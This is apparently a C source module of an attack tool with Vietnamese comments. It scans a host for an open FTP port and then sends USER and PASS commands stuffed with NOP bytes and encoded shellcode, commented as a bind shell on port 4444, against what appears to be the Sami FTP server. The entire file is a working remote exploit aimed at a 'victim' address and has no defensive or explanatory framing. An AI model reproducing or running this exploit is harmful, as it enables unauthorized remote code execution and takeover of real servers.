#include "SamiFTP_40675.h"
int isTarget_SamiFTP_40675(char* strIP){
	fd_set writefds;
	int sock;
	int ip;
	struct sockaddr_in sin;
	struct timeval timeout;
	int nfds;
	u_long opt;
	opt = 0;
	//tạo sock
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return 0;
	ioctlsocket(sock, FIONBIO , &opt);

	memset(&sin, 0, sizeof(sin));
	
		/*for debug*/
	printf("%s\n",strIP);
	ip = inet_addr(strIP);
	if (ip == -1)
		return 0;

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip;
	//tấn công port 21, ftp
	sin.sin_port = htons(21);

	connect(sock,(struct sockaddr*)&sin,sizeof(sin));
	timeout.tv_sec = 0;
	timeout.tv_usec = 0;
	nfds = 0;
	FD_ZERO(&writefds);
	FD_SET((unsigned)sock, &writefds);
	// printf("scan ok!");
	if (select(0, NULL, &writefds, NULL, &timeout) != 1) {
		closesocket(sock);
		return 0;
	} 
	else {
		return sock;
	}
}

int SamiFTP_40675(int sock,char *victim_ip){
	// int ThreadId;
	int len;
	int sizeof_sa;
	int ret;
	u_long opt;
	void *hThread;
	struct sockaddr_in target_ip;
	struct sockaddr_in sa;
	int fd;
	
	char recvbuf[4096];
	int recvbuflen = 4096;
	int i;

	opt = 0;
	ioctlsocket(sock, FIONBIO , &opt);



// Bind shellcode on port 4444 - alpha mixed BufferRegister=EAX
	const char buffer1[]="USER \x90\x90\xu\x04\xde*\x02\x10\xd9\xee\xd9\x34\xe4\x8b\x44\xe4\x0c\x04\x0bPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8mRS0UP7pe0K9jEDqYPU4Nk60VPlKCbdLnkbrWdLKqb4hfoNWczEvdqyoNLElpaalC2dl10kqxO6mEQ9WxbjRf22wNkf220lKsz5lNkblr1sHxcsxGqZqcaLK0YQ05QiCNkCyB8HcVZ1Ynk5dlKEQyF01IoNLYQHOvm31yW6X9pRUXvwsSMIhgKqmDdT5KTf8NkaHWTEQyCavNkDLBklKbx7lgqN3nkC4nkuQXPk9w47Tq4skaKsQV9pZPQkOYpcosobzNkWb8kNmSmbH5cP2C0Wpu8Qgd3UbCof4e80LD7ev379oyElxlP31GpWpFIo4V4bpCXa9op2KePyohURJFhPY0P8bimw0pPG0rpu8xjDOYOipYoiEj7QxWrC0wa3lmYZFbJDPqFqGCXYRIKDw3WkOZuv7CXNWkYehKOkOiEaGPhD4HlwKm1KOhUQGJ7BHRUpnrmqqIokee83S2McT30oyXcQGV767FQIfcZfrv9PVYrImQvKwG4DdelvaGqLM0D5tDPO6GpRd0T602vaFF6w666rnqFsf2sPV0h2YzleoovYoXUK9kPrnSfPFYo00Ph7xk7wmsPYoKeMkxplulb2vsXoVmEOMomKO9EgL4FCLFjk0YkM0qec5Mkg7FsD2ROqzGpv3ioJuAA\r\n";
	const char buffer2[]="PASS \x90\x90\xu\x04\xde*\x02\x10\xd9\xee\xd9\x34\xe4\x8b\x44\xe4\x0c\x04\x0bPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8mRS0UP7pe0K9jEDqYPU4Nk60VPlKCbdLnkbrWdLKqb4hfoNWczEvdqyoNLElpaalC2dl10kqxO6mEQ9WxbjRf22wNkf220lKsz5lNkblr1sHxcsxGqZqcaLK0YQ05QiCNkCyB8HcVZ1Ynk5dlKEQyF01IoNLYQHOvm31yW6X9pRUXvwsSMIhgKqmDdT5KTf8NkaHWTEQyCavNkDLBklKbx7lgqN3nkC4nkuQXPk9w47Tq4skaKsQV9pZPQkOYpcosobzNkWb8kNmSmbH5cP2C0Wpu8Qgd3UbCof4e80LD7ev379oyElxlP31GpWpFIo4V4bpCXa9op2KePyohURJFhPY0P8bimw0pPG0rpu8xjDOYOipYoiEj7QxWrC0wa3lmYZFbJDPqFqGCXYRIKDw3WkOZuv7CXNWkYehKOkOiEaGPhD4HlwKm1KOhUQGJ7BHRUpnrmqqIokee83S2McT30oyXcQGV767FQIfcZfrv9PVYrImQvKwG4DdelvaGqLM0D5tDPO6GpRd0T602vaFF6w666rnqFsf2sPV0h2YzleoovYoXUK9kPrnSfPFYo00Ph7xk7wmsPYoKeMkxplulb2vsXoVmEOMomKO9EgL4FCLFjk0YkM0qec5Mkg7FsD2ROqzGpv3ioJuAA\r\n";

	

	if (send(sock,buffer1,sizeof(buffer1),0)== -1){
		printf("bug USER\n");
		return 0;
	}
	int iResult = 0;
	iResult = recv(sock, recvbuf, recvbuflen, 0);
	if ( iResult > 0 )
            printf("Recvbuf: %s\n", recvbuf);
        else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());


	if (send(sock,buffer2,sizeof(buffer2),0)== -1){
		printf("bug PASS\n");
		return 0;
	}

	iResult = recv(sock, recvbuf, recvbuflen, 0);
	if ( iResult > 0 )
            printf("Recvbuf: %s\n", recvbuf);
        else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());
	iResult = recv(sock, recvbuf, recvbuflen, 0);
	if ( iResult > 0 )
            printf("Recvbuf: %s\n", recvbuf);
        else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());



	closesocket(sock);

	return 1;
}

